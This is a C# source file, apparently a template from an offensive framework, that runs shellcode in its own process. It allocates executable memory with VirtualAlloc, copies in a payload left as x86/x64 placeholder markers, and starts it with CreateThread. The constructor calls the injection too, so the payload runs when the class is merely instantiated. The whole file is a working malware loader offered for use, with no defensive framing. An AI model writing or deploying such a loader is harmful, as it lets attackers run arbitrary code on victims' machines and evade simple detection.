﻿using System;
using System.Runtime.InteropServices;
namespace LocalInject
{
	public class LocalInject
	{
		public LocalInject() {
			Inject();
		}

		static void Main(string[] args) {
			Inject();
		}
		private static int Inject()
		{
			byte[] shellcode;
			// Target process to inject into
			if (IntPtr.Size == 4)
			{ //32 bit 
				___X86_SHELLCODE_MARKER___
			} else //64 bit
			{
				___X64_SHELLCODE_MARKER___
			}


			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
								MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
			IntPtr hThread = IntPtr.Zero;
			UInt32 threadId = 0;

			IntPtr pinfo = IntPtr.Zero;

			// execute native code

			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
			WaitForSingleObject(hThread, 0xFFFFFFFF);
			return 0;
		}

		private static UInt32 MEM_COMMIT = 0x1000;

		private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);



		[DllImport("kernel32")]
		private static extern IntPtr CreateThread(

		  UInt32 lpThreadAttributes,
		  UInt32 dwStackSize,
		  UInt32 lpStartAddress,
		  IntPtr param,
		  UInt32 dwCreationFlags,
		  ref UInt32 lpThreadId

		  );
		[DllImport("kernel32")]
		private static extern bool CloseHandle(IntPtr handle);

		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(

		  IntPtr hHandle,
		  UInt32 dwMilliseconds
		  );
	}

}
